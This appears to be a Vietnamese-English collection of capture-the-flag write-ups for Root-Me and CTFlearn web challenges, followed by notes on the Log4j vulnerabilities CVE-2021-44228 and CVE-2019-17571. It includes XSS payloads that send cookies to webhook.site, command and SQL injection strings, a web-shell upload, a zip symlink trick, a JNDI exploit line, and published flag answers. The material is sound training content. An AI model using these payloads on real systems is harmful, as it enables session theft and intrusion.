# 1. Web application vulnerabilities

## [XSS Stored 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)

### Steps to reproduce

    - Tạo webhook @ https://webhook.site
    - Start Challenge
    - Visit http://challenge01.root-me.org/web-client/ch18/
    - Chọn bất kỳ title
    - Enter message payload: 
    ```
    <h1>xss</h1>
    <script>alert("XSS")</script>
    <script>document.write("<img src=https://webhook.site/15665075-b653-4dc7-bdc2-10b1ace815cf"+document.cookie+"/>");</script>
    <script>new Image().src="https://webhook.site/15665075-b653-4dc7-bdc2-10b1ace815cf?cookie="+document.cookie</script>
    ```
    - Tấn công XSS đơn giản
    - Đợi bot tải hình ảnh và do đó
    - Copy the flag in the captured request cookie

## [XSS Stored 2](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2)

### Steps to reproduce

    - Tạo webhook @ https://webhook.site
    - Start Challenge
    - Mở burp suite
    - Visit http://challenge01.root-me.org/web-client/ch19/
    - Chọn bất kỳ title
    - Chọn bất kỳ message 
    - Header Cookie playload
    ```
    status=invite"><h1>xss</h1>
    status=invite"><script>alert("XSS")</script>
    <script>new Image().src="https://webhook.site/15665075-b653-4dc7-bdc2-10b1ace815cf?cookie="+document.cookie</script>
    ```
    - Đợi bot tải hình ảnh và do đó
    - Copy the admin cookie in the captured request
    - Add the document cookie to the ADMIN_COOKIE
    - Visit the admin section: http://challenge01.root-me.org/web-client/ch19/?section=admin
    - Copy the pass

## [XSS - Reflected](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)

### Steps to reproduce

    - Visit http://challenge01.root-me.org/web-client/ch26/?p=exp' onmousemove='document.location="https://webhook.site/c8a95cae-3c65-4ff0-8d90-e388c8148607?cmd=".concat(document.cookie)
    - Exp' is the reflected xss, we want the document cookie, we encode the paylod
    - Click on Report to the administrator
    - Đợi cho bot tải hình ảnh và do đó là kẻ đánh cắp cookie
    - Sao chép cờ trong cookie

Nếu user truy cập:
```
http://example.com/?p=about
```
→ Server trả về:
```
<a href='?p=about'>Link</a>
```
✅ Bình thường.  
Nhưng attacker gửi:
```
http://example.com/?p=about' onmouseover='alert(1)
```
→ Server trả về:
```
<a href='?p=about' onmouseover='alert(1)'>Link</a>
```
➡️ Lúc này, HTML bị chèn thêm attribute `onmouseover="alert(1)"`.  
Nếu người dùng di chuột vào link → JavaScript chạy → Reflected XSS.  
Nguyên nhân chính:

Input được phản chiếu trực tiếp ra HTML.

Không escape đặc biệt (', ", <, >) trước khi in ra.

Browser hiểu nội dung đó như một phần HTML/JavaScript, không phải plain text.  
`document.location="..."` Dùng để thay đổi URL hiện tại của trình duyệt → tự động điều hướng (redirect).  
`"https://webhook.site/... ?cmd=".concat(document.cookie)`  
`"https://webhook.site/... ?cmd="` → là chuỗi cố định.

`document.cookie` → chứa cookie của người dùng.

`.concat(document.cookie)` → nối cookie vào chuỗi trên.

`.concat()` là hàm của String dùng để nối chuỗi.

## [XSS DOM Based - Introduction](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)

### Steps to reproduce

    - Chall này có một thanh input và nó như một trò chơi nho nhỏ đoán số được sinh ra ngẫu nhiên và ghi lại input vào đoạn mã script
    - Visit http://challenge01.root-me.org/web-client/ch32/contact.php
    - test: http://challenge01.root-me.org/web-client/ch32/index.php?number=1'; alert(1);
    - client script by suffix '; and prefix // respectively 1';alert(1);//';
    - As a payload insert: http://challenge01.root-me.org/web-client/ch32/index.php?number=1';document.location="https://webhook.site/c8a95cae-3c65-4ff0-8d90-e388c8148607?cmd=".concat(document.cookie);//
    - Click on Submit
    - Wait for the bot to click on the link
    - Copy the flag in the captured request cookie

## [Javascript - Obfuscation 1](https://www.root-me.org/en/Challenges/Web-Client/Javascript-Obfuscation-1)
### Steps to reproduce
    - Start 
    - curl -v http://challenge01.root-me.org/web-client/ch4/ch4.html
    - Decode pass.



## [HTTP - Cookies](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Cookies)

### Steps to reproduce

    - Start curl interactively: curl -v http://challenge01.root-me.org/web-serveur/ch7/ 
    - Make a POST request with the paylod mail=abc@gmail.com&jsep4b=send
    - Sau khi view source ta thấy có 1 comment khả nghi: <!--SetCookie("ch7","visiteur");-->
    - Thay đổi giá trị cookie value từ visitor thành admin
    - Make a new GET /web-serveur/ch7/?c=visiteur request to receive the flag

## [HTTP - Directory indexing](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Directory-indexing)

### Steps to reproduce
    - Ctrl + u  <!-- include("admin/pass.html") -->
    - http://challenge01.root-me.org/web-serveur/ch4/adminpas.html --> không có gì
    - http://challenge01.root-me.org/web-serveur/ch4/admin thấy thêm folder backup
    - Visit http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt
    - Copy the flag pass: LINUX

## [HTTP - Headers](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Headers)

### Steps to reproduce

    - GET http://challenge01.root-me.org/web-serveur/ch5/ --> ở response trả về có 1 head Header-RootMe-Admin: no
    - For this run curl --header "Header-RootMe-Admin: no" http://challenge01.root-me.org/web-serveur/ch5/
    - Copy the flag from the response

## [HTTP - IP restriction bypass](https://www.root-me.org/en/Challenges/Web-Server/HTTP-IP-restriction-bypass)

### Steps to reproduce

    - Your IP do not belong to the LAN. --> tìm cách thay đổi ip
    - Một số header quan trọng trong LAN `X-Forwarded-For`: thường có trong proxy nội bộ để ghi lại IP client.
    - Run curl -k http://challenge01.root-me.org/web-serveur/ch68/ -H "X-Forwarded-For: 'your_ipv4_address'"
    - Copy the flag from the response

## [HTTP - Improper redirect](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Improper-redirect)

### Steps to reproduce

    - Don’t trust your browser  --> curl -v --> Mục tiêu truy cập index
    - Run curl -v http://challenge01.root-me.org/web-serveur/ch32/login.php?redirect  --> login form
    - Run curl -v http://challenge01.root-me.org/web-serveur/ch32/index.html --> 404
    - Run curl -v http://challenge01.root-me.org/web-serveur/ch32/index.php --> 200
    - Copy the flag from the response

## [HTTP - Open redirect](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Open-redirect)

### Steps to reproduce

    - Find a way to make a redirection to a domain other than those showed on the web page.
    - http://challenge01.root-me.org/web-serveur/ch52/?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134  --> before
    - Run http://challenge01.root-me.org/web-serveur/ch52/?url=https://google.com&h=a023cfbf5f1c39bdf8407f28b60cd134  --> error Incorrect hash!
    - MD5 hash any site e.g. google.com
    - Run a get curl for http://challenge01.root-me.org/web-serveur/ch52/ with url param set to the site and h param set to the hash
    - Run http://challenge01.root-me.org/web-serveur/ch52/?url=https://google.com&h=99999ebcfdb78df077ad2727fd00969f  --> done
    - Copy the flag from the response

## [HTTP - POST](https://www.root-me.org/en/Challenges/Web-Server/HTTP-POST)

### Steps to reproduce

    - Find a way to beat the top score!
    - Run curl -X POST -F 'score=100000000' -F 'generate=Give+a+try%21' http://challenge01.root-me.org/web-serveur/ch56/
    - Copy the flag from the response

## [HTTP - User-agent](https://www.root-me.org/en/Challenges/Web-Server/HTTP-User-agent )

### Steps to reproduce

    - http://challenge01.root-me.org/web-serveur/ch2/ --> Wrong user-agent: you are not the "admin" browser!
    - Set the user agent to admin (under Edge its in the dev tools Network conditions tab)
    - curl -v -H "User-Agent: admin" http://challenge01.root-me.org/web-serveur/ch2/
    - Reload the page
    - Copy the flag

## [HTTP - Verb tampering](https://www.root-me.org/en/Challenges/Web-Server/HTTP-verb-tampering)

### Steps to reproduce

    - Verb tampering = thay đổi HTTP method (GET/POST/PUT/DELETE/…) để bypass kiểm tra hoặc kích hoạt hành vi không mong muốn.
    - GET → đọc dữ liệu
    - POST → gửi dữ liệu
    - PUT → cập nhật dữ liệu
    - DELETE → xóa dữ liệu
    - HEAD, OPTIONS, PATCH …
    - Run curl -v -X OPTIONS http://challenge01.root-me.org/web-serveur/ch8/ 
    - Copy the flag from the response

## [HTML - Source code](https://www.root-me.org/en/Challenges/Web-Server/HTML-Source-code)

### Steps to reproduce

    - curl http://challenge01.root-me.org/web-serveur/ch1/index.php
    - Copy the flag from the response

## [Weak password](https://www.root-me.org/en/Challenges/Web-Server/Weak-password)

### Steps to reproduce

    - curl http://challenge01.root-me.org/web-serveur/ch3/ --> 401 Authorization Required
    - curl -u admin:admin http://challenge01.root-me.org/web-serveur/ch3/ --> 200 Well done, you can use this password to validate the challenge

## [PHP - Command injection](https://www.root-me.org/en/Challenges/Web-Server/PHP-Command-injection)

### Steps to reproduce

    - C1
    - via http://challenge01.root-me.org/web-serveur/ch54/index.php --> form nhập ex: 127.0.0.1 thử thì có tác tác dụng là ping tới 1 địa chỉ ip.
    - Test thử ;whoami --> done có thể khai thác commad.
    - 127.0.0.1;ls -la
    - phát hiện file .passwd
    - 127.0.0.1;cat .passwd --> done
    - C2
    - payload : 127.0.0.1;cat index.php
```
    <?php 
$flag = "".file_get_contents(".passwd")."";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
        $response = shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
}
?>
```
    - Và đọc .passwd để lấy flag

## [Backup file](https://www.root-me.org/en/Challenges/Web-Server/Backup-file)
### Steps to reproduce

    - Khi vào chall ta thấy ô nhập login và password. 
    - Nhớ tên bài là Backup file nha. Như vậy ta sẽ tìm cách tìm được file backup để xem source code.
    - Ở đây tôi dùng công cụ dirsearch để tìm các file ẩn.
    - dirsearch -u http://challenge01.root-me.org/web-serveur/ch11/ -e * -x 400,403,404 -t 70 --proxy http://127.0.0.1:8080
    - dirsearch -u http://challenge01.root-me.org/web-serveur/ch11/ --proxy http://127.0.0.1:8080
    - Kết quả tìm được file index.php~ (file backup)
    - curl http://challenge01.root-me.org/web-serveur/ch6/index.php~ --> done
    - Copy the passwd from the response

## [File upload - ZIP](https://www.root-me.org/en/Challenges/Web-Server/File-upload-ZIP)
### Steps to reproduce

    - Test upload file abc.zip
    - Web thực hiện giải nén file zip và lưu vào thư mục /web-serveur/ch51/tmp/uploads/abfasfqr546786758c/
    - để đọc được file index.php ở /web-serveur/ch51/tmp/index.php ta cần upload file zip có chứa file symlink trỏ tới /web-serveur/ch51/tmp/index.php
    - Tạo file symlink với đường dẫn tương đối trong linux: ln -s -f ../../../index.php symlink.txt
    - ../../../index.php tương đối tới /web-serveur/ch51/tmp/index.php
    - Tạo file zip có chứa symlink: zip exploit.zip symlink.txt
    - Upload file exploit.zip
    - Truy cập http://challenge01.root-me.org/web-serveur/ch51/tmp/uploads/abfasfqr546786758c/symlink.txt
    - Copy the flag from the response

## [Install file](https://www.root-me.org/en/Challenges/Web-Server/Install-file)
### Steps to reproduce
    - Khi vào chall ta thấy trăng tinh. Crul + u để xem source code.
    - Có comment <!-- /web-serveur/ch6/phpbb" -->
    - Vào thử http://challenge01.root-me.org/web-serveur/ch6/phpbb --> khong có gì
    - Ở đây tôi dùng công cụ dirsearch để tìm các file ẩn.
    - dirsearch -u http://challenge01.root-me.org/web-serveur/ch6/phpbb -e * -x 400,403,404 -t 70 --max-rate=50 --proxy http://127.0.0.1:8080
    - Phát hiện thư mục /install
    - Vào http://challenge01.root-me.org/web-serveur/ch6/phpbb/install
    - Có file install.php
    - curl http://challenge01.root-me.org/web-serveur/ch6/phpbb/install/install.php
    - Copy the flag from the response.

## [File upload - Double extensions](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions)
### Steps to reproduce
    - Test upload file abc.php --> bị chặn
    - Test upload file abc.php.png --> done
    - Sử dụng p0wny-shell để đọc file
    - git clone https://github.com/flozz/p0wny-shell.git
    - cd p0wny-shell/
    - mv shell.php shell.php.png
    - Truy cập http://challenge01.root-me.org/web-serveur/ch20/
    - Uload file shell.php.png
    - chạy như 1 terminal. ls,cd, cat .passwd
    - Copy the flag from the response

## [File upload - MIME type](https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type)
### Steps to reproduce
    - Sử dụng lại shell.php ở chall trên
    - cd p0wny-shell/
    - Test upload file shell.php --> bị chặn
    - Test upload file shell.php.png --> ok
    - Nhưng khi truy cập file thì bị lỗi không hoạt động shell
    - Tại file .png nên đang hiểu là ảnh
    - Sử dụng Burp Suite để sửa header Content-Type từ image/png và đổi tên file thành shell.php
    - oke shell hoạt động
    - chạy như 1 terminal. ls,cd, cat .passwd
    - Copy the flag from the response

## [Nginx - Root Location Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-Root-Location-Misconfiguration)
### Steps to reproduce
    - Trong nginx config này có đoạn root /etc/nginx/;
    - Do đó ta có thể truy cập các file trong /etc/nginx/
    - curl http://challenge01.root-me.org:59093/nginx.conf  --> done
    - Thì thấy có include /etc/nginx/conf.d/default.conf;
    - curl http://challenge01.root-me.org:59093/conf.d/default.conf  --> done
    - Copy the flag from the response.
    - [Đọc thêm](https://viblo.asia/p/cac-cau-hinh-sai-nginx-pho-bien-khien-web-server-cua-ban-gap-nguy-hiem-part-1-6J3ZgNxLKmB)
    - https://blog.detectify.com/industry-insights/common-nginx-misconfigurations-that-leave-your-web-server-ope-to-attack/
    
# 2.  Web application vulnerabilities

## [My Blog](https://ctflearn.com/challenge/979)

### Solution: CTFlearn{n7f_l0c4l_570r463_15n7_53cur3_570r463}

### Steps to reproduce

    - Visit https://noxtal.com/
    - Open Dev Tools
    - Go to Memory
    - Create a snapshot
    - Search for flag{
    - Copy the flag and replace with CTFlearn{the_flag}

## [Basic Injection](https://ctflearn.com/challenge/88)

### Solution: CTFlearn{n7f_l0c4l_570r463_15n7_53cur3_570r463}

### Steps to reproduce

    - Visit https://web.ctflearn.com/web4/
    - Type in test' or '1 = 1
    - Inside the results search for the flag

## [Gobustme](https://ctflearn.com/challenge/1116)

### Solution: CTFlearn{gh0sbu5t3rs_4ever}

### Steps to reproduce

    - Install gobuster
    - Download the provided wordlist
    - Execute gobuster -u https://gobustme.ctflearn.com -w ~/Downloads/common.txt
    - Visit https://gobustme.ctflearn.com/hide

## [POST Practice](https://ctflearn.com/challenge/114)

### Solution: CTFlearn{p0st_d4t4_4ll_d4y}

### Steps to reproduce

    - Install curl
    - Visit http://165.227.106.113/post.php
    - Open up dev tools and look for the username and password
    - Execute curl -X POST -F 'username=admin' -F 'password=71urlkufpsdnlkadsf' http://165.227.106.113/post.php
    - Get the flag from the response

## [Don't Bump Your Head(er)](https://ctflearn.com/challenge/109)

### Solution: CTFlearn{did_this_m3ss_with_y0ur_h34d}

### Steps to reproduce

    - Install curl
    - Run curl -A "Sup3rS3cr3tAg3nt" -H "Referer: awesomesauce.com" http://165.227.106.113/header.php
    - Get the flag from the response

## [Calculat3 M3](https://ctflearn.com/challenge/150)

### Solution: CTFlearn{watch_0ut_f0r_th3_m0ng00s3}

### Steps to reproduce

    - Visit https://web.ctflearn.com/web7/
    - In the dev tools console enter document.getElementById("d").value = ";ls";
    - Basic web command injection
    - Press the equal sign
    - Get the flag from the page

## [Inj3ction Time](https://ctflearn.com/challenge/149)

### Solution: abctf{uni0n_1s_4_gr34t_c0mm4nd}

### Steps to reproduce

    - Visit https://web.ctflearn.com/web8/?id=1+union+select+table_name,0x02,0x03,0x04%20from%20information_schema.tables to find the vulnerable table

    - Visit https://web.ctflearn.com/web8/?id=1+union+select+(SELECT+*+from+w0w_y0u_f0und_m3),0x02,0x03,0x04 to get the flag
  
## [Where Can My Robot Go?](https://ctflearn.com/challenge/107)

### Solution: CTFlearn{r0b0ts_4r3_th3_futur3}
### Steps to reproduce

    - Visit https://ctflearn.com/robots.txt
    - Look for the disallow URL
    - Vist https://ctflearn.com/70r3hnanldfspufdsoifnlds.html
    - Get the flag from the page

## [Base 2 2 the 6](https://ctflearn.com/challenge/192)

### Solution: CTF{FlaggyWaggyRaggy}

### Steps to reproduce

    - Visit https://www.base64decode.org/
    - Decrypt the provided key


# 3.  Known real-world software vulnerabilities

## CVE-2021-44228

Apache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0, this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.

### source code version before detection of the vulnerability

2.12.1 and 2.13.0 through 2.15.0

### source code version released after the vulnerability was discovered

From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0, this functionality has been completely removed

### type of vulnerability

Remote code execution

### source code lines that are affected & fix

* [Restrict LDAP access via JNDI](https://gitbox.apache.org/repos/asf?p=logging-log4j2.git;h=c77b3cb)
* [Log4j2 no longer formats lookups in messages by default](https://github.com/apache/logging-log4j2/pull/607/commits/2731a64d1f3e70001f6be61ba5f9b6eb55f88822)

### exploit

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class log4j {
    private static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:1389/a}");
    }
}
```

### mitigation

* Restrict LDAP access via JNDI
* Disable most JNDI protocols
* Log4j 1.x mitigation: Log4j 1.x does not have Lookups so the risk is lower. Applications using Log4j 1.x are only vulnerable to this attack when they use JNDI in their configuration. A separate CVE (CVE-2021-4104) has been filed for this vulnerability. To mitigate: audit your logging configuration to ensure it has no JMSAppender configured. Log4j 1.x configurations without JMSAppender are not impacted by this vulnerability.
* Log4j 2.x mitigation: Implement one of the mitigation techniques below.
* Java 8 (or later) users should upgrade to release 2.16.0.
* Users requiring Java 7 should upgrade to release 2.12.2 when it becomes available (work in progress, expected to be available soon).
* Otherwise, remove the JndiLookup class from the classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
* In previous releases (>2.10) this behavior can be mitigated by setting system property "log4j2.formatMsgNoLookups" to “true”

## CVE-2019-17571

Included in Log4j 1.2 is a SocketServer class that is vulnerable to deserialization of untrusted data which can be exploited to remotely execute arbitrary code when combined with a deserialization gadget when listening to untrusted network traffic for log data. This affects Log4j versions up to 1.2 up to 1.2.17.

### source code version before detection of the vulnerability

1.2 up to 1.2.17

### source code version released after the vulnerability was discovered

2.8.2 or higher

### type of vulnerability

Remote code execution

### source code lines that are affected

```java
public SocketNode(Socket socket2, LoggerRepository hierarchy2) {
    this.socket = socket2;
    this.hierarchy = hierarchy2;
    try {
        this.ois = new ObjectInputStream(new BufferedInputStream(socket2.getInputStream()));
    } catch (InterruptedIOException e) {
        Thread.currentThread().interrupt();
        logger.error(new StringBuffer().append("Could not open ObjectInputStream to ")
        .append(socket2).toString(), e);
    } catch (IOException e2) {
        logger.error(new StringBuffer().append("Could not open ObjectInputStream to ")
        .append(socket2).toString(), e2);
    } catch (RuntimeException e3) {
        logger.error(new StringBuffer().append("Could not open ObjectInputStream to ")
        .append(socket2).toString(), e3);
    }
}`
```

### exploit

[CVE-2019-17571 exploit](https://0xsapra.github.io/website/CVE-2019-17571)

### fix

* [Deprecate SerializedLayout and remove it as default.](https://git-wip-us.apache.org/repos/asf?p=logging-log4j2.git;h=7067734)
* [Add class filtering to AbstractSocketServer](https://git-wip-us.apache.org/repos/asf?p=logging-log4j2.git;h=5dcc192)
